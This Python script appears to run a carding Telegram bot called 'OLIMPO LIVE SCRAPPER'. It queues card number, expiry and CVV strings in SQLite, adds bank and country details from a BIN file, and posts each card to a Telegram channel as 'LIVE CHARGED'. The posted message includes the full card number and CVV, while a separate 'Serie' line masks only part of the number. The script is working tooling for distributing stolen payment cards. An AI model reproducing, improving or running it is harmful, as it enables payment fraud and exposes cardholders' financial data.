import os
import re
import csv
import time
import sqlite3
import logging
import html
from typing import Dict, Optional, List
import requests
from dotenv import load_dotenv

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
DESTINATION_CHAT = os.getenv("DESTINATION_CHAT")
BUTTON_URL = os.getenv("BUTTON_URL", "")
CSV_BIN_FILE = os.getenv("CSV_BIN_FILE", "tarjetas.csv")
DB_PATH = os.getenv("DB_PATH", "published.db")

if not BOT_TOKEN or not DESTINATION_CHAT:
    raise ValueError("BOT_TOKEN y DESTINATION_CHAT son obligatorios en el archivo .env")

logging.basicConfig(level=logging.DEBUG, format="%(asctime)s - %(levelname)s - %(name)s - %(message)s")
logger = logging.getLogger("publisher")

def _init_db(db_path: str = DB_PATH) -> sqlite3.Connection:
    conn = sqlite3.connect(db_path)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS pending_publish (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            card_data TEXT NOT NULL UNIQUE,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            published INTEGER DEFAULT 0
        )
    """)
    conn.commit()
    return conn

COUNTRY_CODE_BY_NAME = {
    "ARGENTINA": "AR", "AUSTRALIA": "AU", "AUSTRIA": "AT", "BANGLADESH": "BD", "BELGIUM": "BE",
    "BRAZIL": "BR", "BULGARIA": "BG", "CANADA": "CA", "CHILE": "CL", "CHINA": "CN",
    "COLOMBIA": "CO", "COSTA RICA": "CR", "CROATIA": "HR", "DENMARK": "DK", "DOMINICAN REPUBLIC": "DO",
    "ECUADOR": "EC", "EGYPT": "EG", "FINLAND": "FI", "FRANCE": "FR", "GERMANY": "DE", "GREECE": "GR",
    "GUATEMALA": "GT", "HONG KONG": "HK", "INDIA": "IN", "INDONESIA": "ID", "IRELAND": "IE",
    "ITALY": "IT", "JAPAN": "JP", "KOREA, REPUBLIC OF": "KR", "LEBANON": "LB", "MALAYSIA": "MY",
    "MEXICO": "MX", "NETHERLANDS": "NL", "NIGERIA": "NG", "NORWAY": "NO", "PAKISTAN": "PK",
    "PANAMA": "PA", "PERU": "PE", "PHILIPPINES": "PH", "POLAND": "PL", "PORTUGAL": "PT",
    "ROMANIA": "RO", "RUSSIAN FEDERATION": "RU", "SAUDI ARABIA": "SA", "SERBIA": "RS",
    "SINGAPORE": "SG", "SOUTH AFRICA": "ZA", "SPAIN": "ES", "SWEDEN": "SE", "SWITZERLAND": "CH",
    "TAIWAN, PROVINCE OF CHINA": "TW", "THAILAND": "TH", "TURKEY": "TR", "UKRAINE": "UA",
    "UNITED ARAB EMIRATES": "AE", "UNITED KINGDOM": "GB", "UNITED STATES": "US",
    "VENEZUELA, BOLIVARIAN REPUBLIC OF": "VE", "VIET NAM": "VN",
}

def _country_flag(country_name: str) -> str:
    country_code = COUNTRY_CODE_BY_NAME.get((country_name or "").strip().upper())
    if not country_code:
        return ""
    return "".join(chr(ord(char) + 127397) for char in country_code)

def _load_bin_database(csv_path: str) -> Dict[str, Dict[str, str]]:
    bin_db: Dict[str, Dict[str, str]] = {}
    try:
        with open(csv_path, "r", encoding="utf-8-sig", newline="") as f:
            reader = csv.DictReader(f)
            for row in reader:
                bin_code = row.get("bin", "").strip()
                if bin_code:
                    bin_db[bin_code] = {
                        "brand": row.get("brand", "Desconocido").strip(),
                        "tipo": row.get("tipo", "Desconocido").strip(),
                        "nivel": row.get("nivel", "").strip(),
                        "banco": row.get("Banco", "Desconocido").strip(),
                        "pais": row.get("país", "Desconocido").strip(),
                        "bin": bin_code,
                    }
        logger.debug("Base BIN cargada: %d entradas desde %s", len(bin_db), csv_path)
    except FileNotFoundError:
        logger.warning("Archivo CSV de BINs no encontrado: '%s'", csv_path)
    except Exception:
        logger.exception("Error cargando BINs desde %s", csv_path)
    return bin_db

def _mask_card_number(card_number: str) -> str:
    if 'x' in card_number.lower():
        return card_number
    if len(card_number) <= 4:
        return "X" * len(card_number)
    show_digits = min(12, len(card_number) - 4)
    return card_number[:show_digits] + "X" * (len(card_number) - show_digits)

def _get_bin_info(card_number: str, bin_database: Dict[str, Dict[str, str]]) -> Optional[Dict[str, str]]:
    clean_number = re.sub(r'[^0-9]', '', card_number.split('|')[0])
    for length in (6, 5, 4):
        if len(clean_number) >= length:
            bin_code = clean_number[:length]
            if bin_code in bin_database:
                return bin_database[bin_code]
    return None

def _format_card_message(card_data: str, bin_database: Dict[str, Dict[str, str]], monto_nombre: str = "$1 MXN CARGO") -> Optional[str]:
    parts = card_data.split("|")
    if len(parts) == 4:
        card_num, month, year, cvv = parts
    elif len(parts) == 3:
        card_num, month, year = parts
        cvv = "xxx"
    else:
        return None
    if len(card_num) < 12 or len(month) != 2:
        return None
    bin_info = _get_bin_info(card_num, bin_database)
    censored_card_num = _mask_card_number(card_num)
    display_year = f"20{year}" if len(year) == 2 else year
    cvv_display = cvv[:3] if cvv != "xxx" else "No disponible"
    censored = f"{censored_card_num}|{month}|{display_year}"
    tipo = brand = nivel = banco = pais = bin_code_found = "Desconocido"
    if bin_info:
        tipo = bin_info.get("tipo", "Desconocido")
        brand = bin_info.get("brand", "Desconocido")
        nivel = bin_info.get("nivel", "")
        banco = bin_info.get("banco", "Desconocido")
        pais = bin_info.get("pais", "Desconocido")
        bin_code_found = bin_info.get("bin", "Desconocido")
    country_with_flag = f"{pais} {_country_flag(pais)}".strip()

    # Formato solicitado
    message = (
        f"<b>⚜️ OLIMPO LIVE SCRAPPER ⚜️</b>\n"
        f"<b></b>\n"
        f"<b>✅ LIVE CHARGED {monto_nombre}</b>\n"
        f"<b></b>\n"
        f"<b>CC:</b><code>{html.escape(card_num)}|{month}|{display_year}|{cvv_display}</code>\n"
        f"<b>#<code>{html.escape(bin_code_found)}</code></b>\n"
        f"<b>━━━━━━━━</b>\n"
        f"<b>Serie= <code>{html.escape(censored)}</code></b>\n"
        f"<b>Bin= <code>{html.escape(bin_code_found)}</code></b>\n"
        f"<b>Banco= {html.escape(banco)}</b>\n"
        f"<b>Marca= {html.escape(brand)}</b>\n"
        f"<b>Tipo= {html.escape(tipo)}</b>\n"
        f"<b>Nivel= {html.escape(nivel)}</b>\n"
        f"<b>País= {html.escape(country_with_flag)}</b>\n"
        f"<b>━━━━━━━━</b>\n"
        f"<b>DESARROLLADO POR</b>\n"
        f"<b><code>@MrMxyzptlk04</code></b>\n"
        f"<b>━━━━━━━━</b>\n"
    )
    return message

def _send_card_sync(message: str) -> bool:
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": DESTINATION_CHAT,
        "text": message,
        "parse_mode": "HTML",
    }
    if BUTTON_URL:
        payload["reply_markup"] = {
            "inline_keyboard": [[{"text": "⭐ OLIMPO", "url": BUTTON_URL}]]
        }
    logger.debug("Enviando mensaje a Telegram: %s...", message[:100])
    for attempt in range(2):
        try:
            resp = requests.post(url, json=payload, timeout=15)
            logger.debug("Telegram HTTP %s: %s", resp.status_code, resp.text[:200])
            if resp.status_code == 200:
                return True
            if resp.status_code == 429:
                retry_after = resp.json().get("parameters", {}).get("retry_after", 5)
                logger.warning("Rate limit, esperando %.1fs", retry_after)
                time.sleep(retry_after)
                continue
            logger.error("Error Telegram %s: %s", resp.status_code, resp.text[:200])
            return False
        except requests.RequestException as e:
            logger.error("Excepción de red: %s", e)
            if attempt == 0:
                time.sleep(5)
            else:
                return False
    return False

def insert_pending(card_data: str, db_path: str = DB_PATH) -> bool:
    conn = _init_db(db_path)
    try:
        conn.execute(
            "INSERT OR IGNORE INTO pending_publish (card_data) VALUES (?)",
            (card_data,)
        )
        conn.commit()
        inserted = conn.total_changes > 0
        logger.debug("Insert pending: %s -> %s", card_data, inserted)
        return inserted
    except Exception as e:
        logger.error("Error insertando pendiente: %s", e)
        return False
    finally:
        conn.close()

def publish_pending_cards(db_path: str = DB_PATH, delay: float = 1.5, monto_nombre: str = "$1 MXN CARGO") -> int:
    conn = _init_db(db_path)
    rows = conn.execute(
        "SELECT id, card_data FROM pending_publish WHERE published = 0 ORDER BY id"
    ).fetchall()
    if not rows:
        logger.info("No hay tarjetas pendientes por publicar.")
        conn.close()
        return 0
    bin_db = _load_bin_database(CSV_BIN_FILE)
    if not bin_db:
        logger.error("No se pudo cargar la base de BINs. Abortando.")
        conn.close()
        return 0
    logger.info("Publicando %d tarjetas pendientes...", len(rows))
    sent = 0
    for idx, (row_id, card_data) in enumerate(rows, 1):
        msg = _format_card_message(card_data, bin_db, monto_nombre)
        if not msg:
            logger.warning("Formato inválido, se marca como publicada igual: %s", card_data)
            conn.execute("UPDATE pending_publish SET published = 1 WHERE id = ?", (row_id,))
            conn.commit()
            continue
        success = _send_card_sync(msg)
        if success:
            sent += 1
            conn.execute("UPDATE pending_publish SET published = 1 WHERE id = ?", (row_id,))
            conn.commit()
            logger.debug("Publicada (%d/%d): %s", idx, len(rows), card_data)
        else:
            logger.error("Fallo al publicar (%d/%d): %s", idx, len(rows), card_data)
        if idx < len(rows):
            time.sleep(delay)
    conn.close()
    logger.info("Publicación completada: %d/%d enviadas.", sent, len(rows))
    return sent

def get_pending_count(db_path: str = DB_PATH) -> int:
    conn = _init_db(db_path)
    count = conn.execute(
        "SELECT COUNT(*) FROM pending_publish WHERE published = 0"
    ).fetchone()[0]
    conn.close()
    return count
